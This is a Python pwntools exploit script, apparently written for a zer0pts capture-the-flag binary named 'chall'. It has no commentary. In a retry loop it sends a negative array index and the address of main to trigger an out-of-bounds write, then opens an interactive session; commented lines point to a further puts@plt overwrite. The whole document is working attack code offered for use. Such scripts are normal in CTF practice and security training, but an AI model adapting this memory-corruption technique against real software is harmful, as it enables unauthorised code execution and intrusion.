#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.ctf.zer0pts.com', 9004
binary = './chall'
brkpts = '''
'''

elf = ELF("chall")
libc = ELF("libc.so.6")

context.arch = "amd64"
#context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)
main = 0x0000000000400737
start = 0x0000000000400650
puts_plt = 0x00000000004005e0
'''
if len(sys.argv) > 1:
    io = remote(remote_ip, port)
else:
    io=process("./chall",env = {"LD_PRELOAD" : "./libc.so.6"})
'''
if __name__=="__main__":
    while(True):
        if len(sys.argv) > 1:
            io = remote(remote_ip, port)
            context.noptrace = True
        else:
            io=process("./chall",env = {"LD_PRELOAD" : "./libc.so.6"})
        try:
            sla("n = ",str(0x10))
            sla("i = ",'-1186')
            sla(" = ",str(main))
            #gdb.attach(io)
            reu("n = ")
            #log.success("Called Main!!")
            sl("10")
            #sla("i = ",'-11028')
            #sla("] = ",str(puts_plt))
            io.interactive()
        except EOFError:
            io.close()
            log.failure("Restart Exploit")
            continue
